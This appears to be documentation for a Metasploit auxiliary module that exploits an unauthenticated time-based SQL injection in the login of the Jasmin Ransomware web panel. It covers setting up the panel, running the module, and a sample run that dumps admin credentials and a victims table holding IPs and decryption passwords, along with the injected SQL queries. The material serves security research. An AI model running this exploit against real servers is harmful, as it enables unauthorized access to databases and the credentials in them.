## Vulnerable Application

The Jasmin Ransomware web server contains an unauthenticated SQL injection vulnerability
within the login functionality. As of April 15, 2024 this was still unpatched, so all
versions are vulnerable. The last patch was in 2021, so it will likely not ever be patched.

Retrieving the victim's data may take a long amount of time. It is much quicker to
get the logins, then just login to the site.

### Install

create a LAMP server (using php 8.2 worked for me, 7.2 did not).
Run the following commands:

```
git clone https://github.com/codesiddhant/Jasmin-Ransomware.git
cd Jasmin-Ransomware
sudo cp -r Web\ Panel/* /var/www/html/
sudo chown www-data:www-data /var/www/html/*
sudo mysql -p
```

Execute the following SQL commands:

```
CREATE DATABASE jasmin_db;
CREATE USER 'jasminadmin'@'localhost' IDENTIFIED BY '123456';
GRANT ALL PRIVILEGES ON jasmin_db.* TO 'jasminadmin'@'localhost';
Exit
```

Now setup the database:
`sudo mysql -u jasminadmin -p123456 jasmin_db < Web\ Panel/database/jasmin_db.sql`

## Verification Steps

1. Install the application
1. Start msfconsole
1. Do: `use auxiliary/gather/jasmin_ransomware_sqli`
1. Do: `set rhosts [IP]`
1. Do: `run`
1. You should contents from the SQL Database.

## Options

### VICTIMS

Pull data from the Victim's table. Defaults to `false`

### VICTIMLIMIT

Number of rows from the victim table to pull. Defaults to `nil` which pulls all rows.

## Scenarios

### Jasmin installed on Ubuntu 22.04

```
msf6 > use auxiliary/gather/jasmin_ransomware_sqli
msf6 auxiliary(gather/jasmin_ransomware_sqli) > set verbose true
verbose => true
msf6 auxiliary(gather/jasmin_ransomware_sqli) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf6 auxiliary(gather/jasmin_ransomware_sqli) > set victims true
victims => true
msf6 auxiliary(gather/jasmin_ransomware_sqli) > run

[*] Dumping login table
[*] {SQLi} Executing (select group_concat(cast(concat_ws(';',ifnull(admin,''),ifnull(creds,'')) as binary)) from master)
[*] {SQLi} Time-based injection: expecting output of length 15
[+] Dumped table contents:
Logins
======

 admin     creds
 -----     -----
 siddhant  123456

[*] Dumping victim table
[*] {SQLi} Executing (select group_concat(cast(concat_ws(';',ifnull(machine_name,''),ifnull(computer_user,''),ifnull(ip,''),ifnull(systemid,''),ifnull(password,'')) as binary)) from victims)
[*] {SQLi} Time-based injection: expecting output of length 428
[+] Dumped table contents:
Victims
=======

 machine_name     computer_user  ip              systemid                  password
 ------------     -------------  --              --------                  --------
 Bollywood        Salman Khan    47.247.223.177  df545f454f5d4f5d4af5      M9M99EvNpZVOWpy9Q8sZLHEP
 DESKTOP-37Q74QH  cyberstair     47.247.223.177  96457DF79A87C7C0008A7BE7  xAS4NinH/HQKNJwsNtTWN5yD
 FiFa             Leone Messi    47.247.223.177  cfhsfkdjkfvdd454s5g4      JDNAaz6e3oyM8cN+AGFdMl/5
 Indian Cricket   Virat Kohli    47.247.223.177  SDGFs4F4S4FD4F4545fs      3tIHrYJqqTSBpw4lgMMck1GD
 White House      Donald Trump   47.247.223.177  fgighefesdgvrd5g45rd4h    RJtCd9QqiCfBaSU0zQf84dvd

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

